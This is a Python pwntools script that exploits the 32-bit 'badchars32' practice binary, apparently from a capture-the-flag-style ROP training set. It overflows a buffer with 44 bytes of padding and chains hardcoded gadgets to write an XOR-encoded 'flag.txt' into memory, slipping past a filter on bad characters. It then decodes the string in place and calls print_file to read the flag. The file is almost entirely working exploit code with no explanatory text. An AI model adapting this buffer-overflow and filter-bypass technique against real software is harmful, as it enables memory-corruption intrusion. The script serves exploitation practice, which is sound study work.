from pwn import *
io = process("./badchars32")

padding = b"A" * 44
movEdiEsi = p32(0x0804854f)
xorEbpEbx = p32(0x08048547)
popEbp = p32(0x080485bb)
popEbxEsiEdiEbp = p32(0x080485b8)
popEsiEdiEbp = p32(0x080485b9)
printFilePlt = p32(0x080483d0)

def checkBadChars(string):
    for i in string:
        if i == ord("x") or i == ord("g") or i == ord("a") or i == ord("."):
            return False

    return True

def craftExploit(initialString,pos):
    stringLocation = pos
    strLen = len(initialString)
    if strLen != 8:
        print("Length need to be 8 bytes")
        return False

    string = b""
    for i in range(strLen):
        string += str.encode(chr(initialString[i] ^ 15))

    #mov string into memory and xor first and second char
    exploit = padding + popEbxEsiEdiEbp + p32(15) + string[:4] + p32(stringLocation) + p32(stringLocation) + movEdiEsi + xorEbpEbx + popEsiEdiEbp + string[4:] + p32(stringLocation + 4) + p32(stringLocation + 1) + movEdiEsi + xorEbpEbx

    for i in range(6):
        exploit += popEbp + p32(stringLocation + i + 2) + xorEbpEbx

    exploit += printFilePlt + b"AAAA" + p32(stringLocation)
    return exploit

#Xor reverse Xor
#n ^ 15 = a; h ^ 15 = g; ! ^ 15 = .; w ^ 15 = x
exploit = craftExploit(b"flag.txt",0x804a054)
io.send(exploit)
io.recvuntil(b"Thank you!\n")
print(io.recv().decode())
